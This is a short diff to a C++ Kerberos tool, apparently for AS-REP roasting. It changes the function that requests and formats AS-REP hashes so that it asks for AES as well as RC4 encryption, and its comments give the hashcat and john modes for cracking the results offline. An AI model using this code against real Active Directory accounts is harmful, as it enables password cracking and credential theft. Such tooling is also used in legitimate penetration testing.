@@ -264,15 +264,21 @@ std::string KerberosInteraction::requestAndFormatASREP(
         return "";
     }
 
-    // Ask only for RC4-HMAC so the AS-REP yields the classic, hashcat-friendly
-    // (-m 18200) hash. Requires the account to have an RC4 key and the local
-    // krb5 to permit it (allow_weak_crypto = true).
+    // Offer AES (preferred) then RC4 in the AS-REQ etype list; the KDC returns
+    // the strongest key the account holds and formatASREP adapts to it. AES
+    // (etype 17/18) hashes crack with `john --format=krb5asrep`; RC4 (etype 23)
+    // with `hashcat -m 18200` (RC4 needs the account to hold an RC4 key and the
+    // local krb5 to permit it via allow_weak_crypto = true).
     krb5_get_init_creds_opt* options = nullptr;
     if (krb5_get_init_creds_opt_alloc(context_.get(), &options)) {
         return "";
     }
-    krb5_enctype rc4Only[] = {ENCTYPE_ARCFOUR_HMAC};
-    krb5_get_init_creds_opt_set_etype_list(options, rc4Only, 1);
+    krb5_enctype etypes[] = {
+        ENCTYPE_AES256_CTS_HMAC_SHA1_96,
+        ENCTYPE_AES128_CTS_HMAC_SHA1_96,
+        ENCTYPE_ARCFOUR_HMAC,
+    };
+    krb5_get_init_creds_opt_set_etype_list(options, etypes, 3);
 
     krb5_init_creds_context icc = nullptr;
     krb5_error_code err = krb5_init_creds_init(
